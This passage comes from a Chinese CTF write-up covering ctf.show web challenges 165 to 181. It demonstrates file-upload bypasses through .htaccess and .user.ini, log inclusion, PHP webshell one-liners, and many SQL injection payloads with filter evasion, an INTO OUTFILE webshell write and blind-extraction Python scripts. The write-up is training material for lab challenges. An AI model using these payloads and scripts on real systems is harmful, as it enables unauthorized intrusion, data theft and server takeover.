</span></span><span class="line"><span class="ln">130</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">131</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">
</span></span><span class="line"><span class="ln">134</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">135</span><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">size</span> <span class="o">-</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">
</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">skip</span><span class="p">(</span><span class="nv">$skip</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="nv">$skip</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">140</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">
</span></span><span class="line"><span class="ln">142</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">readByte</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">eof</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">            <span class="nv">$byte</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl">            <span class="k">return</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$byte</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">149</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">150</span><span class="cl">
</span></span><span class="line"><span class="ln">151</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">readShort</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">154</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">            <span class="nv">$short</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">order</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">158</span><span class="cl">                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl">                <span class="nv">$short</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$short</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">161</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">            <span class="k">return</span> <span class="nv">$short</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl">
</span></span><span class="line"><span class="ln">165</span><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="nf">eof</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl">            <span class="k">return</span> <span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="o">||</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">binData</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>jpg图片比较脆弱，成功率很低，我试了十多张图片都没成功</p>
<h4 id="web166">web166<a hidden class="anchor" aria-hidden="true" href="#web166">#</a></h4>
<p>zip注入</p>
<p>这题只能上传zip，上传后会出现查看文件，存在文件包含</p>
<p>本质上就是利用文件包含执行我们的恶意代码</p>
<p><img alt="image-20250128184205535" loading="lazy" src="./assets/image-20250128184205535.png"></p>
<h4 id="web167">web167<a hidden class="anchor" aria-hidden="true" href="#web167">#</a></h4>
<p>.htaccess文件利用</p>
<blockquote>
<p>什么是.htaccess？</p>
<p>htaccess文件是<a href="https://baike.baidu.com/item/Apache/0?fromModule=lemma_inlink">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91/1135400?fromModule=lemma_inlink">301重定向</a>、自定义<a href="https://baike.baidu.com/item/404%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2/583066?fromModule=lemma_inlink">404错误页面</a>、改变<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D/1270230?fromModule=lemma_inlink">文件扩展名</a>、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote>
<p>如果服务器开启了.htaccess，那我们就可以利用.htaccess将jpg或者png等后缀的文件，作为php文件解析</p>
<pre tabindex="0"><code>AddType/AddHandler application/x-httpd-php &#34;.jpg&#34;
</code></pre><p>由于有前端验证，我们要先把编写好的.htaccess文件改为.jpg后缀</p>
<p>再通过抓包将文件名修改为.htaccess</p>
<p><img alt="image-20250129181407357" loading="lazy" src="./assets/image-20250129181407357.png"></p>
<p>接着上传我们写好的一句话木马(后缀为.jpg)</p>
<p><img alt="image-20250129181144016" loading="lazy" src="./assets/image-20250129181144016.png"></p>
<p><img alt="image-20250129181548565" loading="lazy" src="./assets/image-20250129181548565.png"></p>
<p>可以看到我们的一句话木马已经被成功执行了</p>
<h4 id="web168">web168<a hidden class="anchor" aria-hidden="true" href="#web168">#</a></h4>
<p>基础免杀</p>
<p><img alt="image-20250129233605531" loading="lazy" src="./assets/image-20250129233605531.png"></p>
<p>这题没有限制文件类型，可以上传php</p>
<p>应该是对关键词有过滤</p>
<p><img alt="image-20250129235142888" loading="lazy" src="./assets/image-20250129235142888.png"></p>
<p>简单拼接一下试试，没想到直接成功了</p>
<p>payload</p>
<pre tabindex="0"><code>&lt;?php $a=&#34;sys&#34;.&#34;tem&#34;; $a($_REQUEST[1]);?
</code></pre><pre tabindex="0"><code>GET 1=tac%20../flagaa.php
</code></pre><h4 id="web169">web169<a hidden class="anchor" aria-hidden="true" href="#web169">#</a></h4>
<p>.user.ini文件包含</p>
<p><strong>前端做了校验只能传<code>zip</code>文件,后端又做了图片文件检查(需要改成image/png).过滤了<code>&lt;&gt;</code>和<code>php</code></strong></p>
<p><strong>先上传一个<code>index.php</code>，然后利用日志包含，上传<code>.user.ini</code> 写入以下内容进行包含然后<code>UA</code>里面写木马</strong></p>
<pre tabindex="0"><code>auto_append_file=&#34;/var/log/nginx/access.log&#34;

&lt;?=system(&#39;cat ../flagaa.php&#39;)?&gt;
</code></pre><p><img alt="image-20250130090337705" loading="lazy" src="./assets/image-20250130090337705.png"></p>
<h4 id="web170">web170<a hidden class="anchor" aria-hidden="true" href="#web170">#</a></h4>
<p>这题和web169解法一样，也是可以进行日志包含</p>
<h3 id="sql注入">sql注入<a hidden class="anchor" aria-hidden="true" href="#sql注入">#</a></h3>
<h4 id="无过滤注入对输出内容进行过滤"><strong>无过滤注入</strong>（对输出内容进行过滤）<a hidden class="anchor" aria-hidden="true" href="#无过滤注入对输出内容进行过滤">#</a></h4>
<h4 id="web171">web171<a hidden class="anchor" aria-hidden="true" href="#web171">#</a></h4>
<pre tabindex="0"><code>$sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;
</code></pre><p>flag是存在于username为flag的用户的数据中，我们只需要通过</p>
<pre tabindex="0"><code>1&#39; or 1=1 --+
</code></pre><p>即可输出所有用户数据</p>
<h4 id="web172">web172<a hidden class="anchor" aria-hidden="true" href="#web172">#</a></h4>
<p>相比上一题，这题增加了过滤</p>
<pre tabindex="0"><code>//检查结果是否有flag
if($row-&gt;username!==&#39;flag&#39;){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    }
</code></pre><p>方法一: 联合查询</p>
<p>因为联合查询只会显示password</p>
<pre tabindex="0"><code>api/?id=1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23

/api/?id=1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),database()%23

/api/?id=1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;ctfshow_web&#39; and table_name=&#39;ctfshow_user&#39;),database()%23

//看到有3列 id,username,password

/api/?id=1&#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23

//查询password发现没有flag

//查另一个表 ctfshow_user2

/api/?id=1&#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23

//看到flag
</code></pre><p>方法二: 将用户名字段进行编码，绕过检测</p>
<pre tabindex="0"><code>-1&#39; union select to_base64(username),password from ctfshow_user2 --+
</code></pre><p>方法三: 只查询密码</p>
<pre tabindex="0"><code>-1&#39; union select id,password from ctfshow_user2 where username=&#39;flag
</code></pre><h4 id="web173">web173<a hidden class="anchor" aria-hidden="true" href="#web173">#</a></h4>
<p>过滤要求查询结果中不能出现flag字段</p>
<pre tabindex="0"><code>//检查结果是否有flag
    if(!preg_match(&#39;/flag/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    }
</code></pre><p>方法一：联合查询</p>
<p>和上题解法一样，只是这题flag在ctfshow_user3</p>
<p>方法二：</p>
<p>只查询password</p>
<pre tabindex="0"><code>-1&#39; union select id,id,password from ctfshow_user3 where username=&#39;flag
</code></pre><p>方法三: 将用户名字段进行编码，绕过检测</p>
<pre tabindex="0"><code>-1&#39; union select to_base64(username),password from ctfshow_user3 --+
</code></pre><h4 id="web174">web174<a hidden class="anchor" aria-hidden="true" href="#web174">#</a></h4>
<p>输出时增加了过滤数字</p>
<pre tabindex="0"><code>//检查结果是否有flag和数字
    if(!preg_match(&#39;/flag|[0-9]/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
}     
</code></pre><p>由于flag中含有数字，哪怕像之前的通过to_base64等编码后，仍然不可避免数字的出现</p>
<p>所以这题我们要用到布尔盲注</p>
<p>放个脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1&#39; and &#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s1">,1,0) -- -&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>又或者通过replace方法将数字替换成其他的合法字符</p>
<pre tabindex="0"><code>1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#39;A&#39;),2,&#39;B&#39;),3,&#39;C&#39;),4,&#39;D&#39;),5,&#39;E&#39;),6,&#39;F&#39;),7,&#39;G&#39;),8,&#39;H&#39;),9,&#39;I&#39;),0,&#39;J&#39;),&#39;b&#39; from ctfshow_user4 where username=&#39;flag&#39; %23
</code></pre><p><img alt="image-20250206225601177" loading="lazy" src="./assets/image-20250206225601177.png"></p>
<p>拿到flag后替换回去就行</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"> 
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">flag64</span> <span class="o">=</span> <span class="s2">&#34;ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}&#34;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"> 
</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">flag64</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;D&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;E&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;F&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;G&#34;</span><span class="p">,</span> <span class="s2">&#34;7&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;H&#34;</span><span class="p">,</span> <span class="s2">&#34;8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">,</span> <span class="s2">&#34;9&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;J&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl"> 
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><p>又或者</p>
<p><img alt="image-20250207160041895" loading="lazy" src="./assets/image-20250207160041895.png"></p>
<pre tabindex="0"><code>1&#39; union select 1,&#34;&lt;?=eval($_POST[1]);?&gt;&#34; into outfile &#34;/var/www/html/shell.php&#34; --+ 
</code></pre><h4 id="web175">web175<a hidden class="anchor" aria-hidden="true" href="#web175">#</a></h4>
<pre tabindex="0"><code>//检查结果是否有flag
    if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    }
      
</code></pre><p>检查变量 <code>$ret</code> 经过 <code>json_encode</code> 编码后的结果中是否只包含 ASCII 字符（即字符编码范围在 <code>\x00</code> 到 <code>\x7f</code> 之间）。如果不满足这个条件，就将 <code>$ret</code> 数组中的 <code>msg</code> 键的值设置为 <code>'查询成功'</code>。</p>
<p>也就是没有任何回显</p>
<p>方法一：<strong>时间盲注</strong></p>
<p>大佬的脚本，用的二分法</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1&#39; and &#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s1">,sleep(2),0) -- -&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>方法二:利用读写文件写入网站根目录
<a href="http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1%27">http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1'</a> union select 1,password from ctfshow_user5 into outfile &lsquo;/var/www/html/1.txt&rsquo;&ndash;+&amp;page=1&amp;limit=10
之后访问http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt</p>
<h4 id="过滤注入对传入参数进行过滤"><strong>过滤注入</strong>（对传入参数进行过滤）<a hidden class="anchor" aria-hidden="true" href="#过滤注入对传入参数进行过滤">#</a></h4>
<h4 id="web176">web176<a hidden class="anchor" aria-hidden="true" href="#web176">#</a></h4>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
</code></pre><p>方法一：万能钥匙</p>
<pre tabindex="0"><code>1&#39; or 1=1--+
</code></pre><p><img loading="lazy" src="./assets/image-20250207173909940.png"></p>
<p>能找到flag</p>
<p>方法二:大小写绕过</p>
<pre tabindex="0"><code>1&#39; uNion sElect 1,2,password from ctfshow_user --+
</code></pre><h4 id="web177">web177<a hidden class="anchor" aria-hidden="true" href="#web177">#</a></h4>
<p><strong>黑名单</strong>：空格、+</p>
<p><strong>空格替代</strong>：%20（普通空格）、%09（水平制表符）、%0a（换行符）、%0b（回车符）、%0c（新一页）、%0d（垂直制表符）、%a0、()、``、\**\</p>
<p>可以用\**\绕过</p>
<pre tabindex="0"><code>1&#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23
</code></pre><p>方法二:万能钥匙</p>
<h4 id="web178">web178<a hidden class="anchor" aria-hidden="true" href="#web178">#</a></h4>
<p><strong>黑名单增加</strong>：%20、*</p>
<pre tabindex="0"><code>1&#39;%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09=&#39;flag&#39;%23
</code></pre><p>方法二:万能钥匙</p>
<h4 id="web179">web179<a hidden class="anchor" aria-hidden="true" href="#web179">#</a></h4>
<p><strong>黑名单增加</strong>：%09、%0a、%0b、%0d</p>
<p>这题把%09也过滤了，这题空格可以用%0c绕过</p>
<pre tabindex="0"><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23
</code></pre><h4 id="web180">web180<a hidden class="anchor" aria-hidden="true" href="#web180">#</a></h4>
<p><strong>黑名单增加</strong>：#</p>
<p>可以用&ndash;%0c代替#(%23)</p>
<pre tabindex="0"><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c
</code></pre><p>或者直接万能密码</p>
<pre tabindex="0"><code>id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1
</code></pre><h4 id="web181">web181<a hidden class="anchor" aria-hidden="true" href="#web181">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//对传入的参数进行了过滤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><blockquote>
<ul>
<li>
<p><strong><code>/</code> 和 <code>/i</code></strong>：正则表达式的定界符，<code>/</code> 表示正则表达式的开始和结束，<code>i</code> 是修饰符，表示不区分大小写进行匹配。</p>
</li>
<li>
<p><strong><code>|\*</code></strong>：匹配空格字符（）和星号（<code>*</code>），这两个字符在 SQL 注入中可能会被用于构造恶意语句。</p>
</li>
<li>
<p><code>\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0</code></p>
<p>：分别匹配不同的 ASCII 控制字符和特殊空白字符，例如：</p>
<ul>
